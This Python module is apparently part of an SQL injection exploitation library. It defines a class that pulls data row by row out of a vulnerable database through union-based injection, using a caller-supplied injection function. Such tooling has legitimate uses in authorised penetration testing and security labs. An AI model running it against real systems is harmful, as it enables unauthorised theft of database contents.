from __future__ import annotations
from typing import Any
from sqlinjectlib._sqlinjectlib import SQLInjector, InjectorFunction
from sqlinjectlib._databases import DatabaseType, MySQL
from sqlinjectlib._typedql import SimpleQuery, SQL
from collections.abc import AsyncGenerator
from sqlinjectlib._utils import wrap


class UnionInjector(SQLInjector):
    """Union based SQL injection

    You have a union based SQL injection when you can get a single value from a query using the union statement
    """

    def __init__(
        self,
        injector: InjectorFunction[SQL[str], str | None],
        /,
        *,
        database_type: DatabaseType = MySQL(),
    ):
        """
        - injector: function that given a string SQL expression, returns the result
        - database_type: the type of the database you are injecting into
        """
        self.__injector = wrap(injector)
        super().__init__(self.__call, database_type=database_type)

    async def __find_string(self, query: SQL[Any]) -> str | None:
        return await self.__injector(SQL.str(query))

    async def __call(self, query: SimpleQuery) -> list[str | None]:
        length_result = await self.__find_string(SQL.count(query))
        if length_result is None:
            raise ValueError(f"Error getting number of rows, found null, '{query}'")
        length = int(length_result)
        return [await self.__find_string(SQL.subquery(query, i)) for i in range(length)]

    async def test(self) -> AsyncGenerator[tuple[str, bool], None]:
        yield ("value", await self.__find_string(SQL.int(1)) == "1")
        async for elem in super().test():
            yield elem
